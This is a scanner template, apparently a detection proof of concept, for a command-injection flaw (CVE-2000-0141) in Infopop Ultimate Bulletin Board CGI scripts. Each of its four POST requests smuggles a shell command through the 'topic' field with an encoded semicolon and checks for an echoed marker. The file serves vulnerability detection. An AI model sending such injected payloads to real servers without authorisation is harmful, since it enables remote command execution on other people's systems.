[info]
author = "AVE"
description = "检测 Infopop Ultimate Bulletin Board 的 topic 隐藏字段命令注入漏洞。远程攻击者可通过在 topic 参数中注入 shell 元字符实现任意命令执行，CVSS 10.0。"
id = "POC-AVE-2000-0408"
name = "CVE-2000-0141 PoC"
severity = "critical"
tags = [
    "cve-2000-0141",
    "command-injection",
    "ubb",
]
vuln_id = [
    "CVE-2000-0141",
    "AVE-2000-0408",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/Ultimate.cgi"
protocol = "http"

[poc.requests.body]
content = "topic=normal%3Becho+UBB_INJECTION_MARKER_2000&action=post"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["UBB_INJECTION_MARKER_2000"]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/Ultimate.cgi"
protocol = "http"

[poc.requests.body]
content = "topic=normal%3Becho+UBB_INJECTION_MARKER_2000&action=post"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["UBB_INJECTION_MARKER_2000"]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/ubb/Ultimate.cgi"
protocol = "http"

[poc.requests.body]
content = "topic=normal%3Becho+UBB_INJECTION_MARKER_2000&action=post"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["UBB_INJECTION_MARKER_2000"]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/ubbmisc.cgi"
protocol = "http"

[poc.requests.body]
content = "topic=normal%3Becho+UBB_INJECTION_MARKER_2000&action=post"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["UBB_INJECTION_MARKER_2000"]
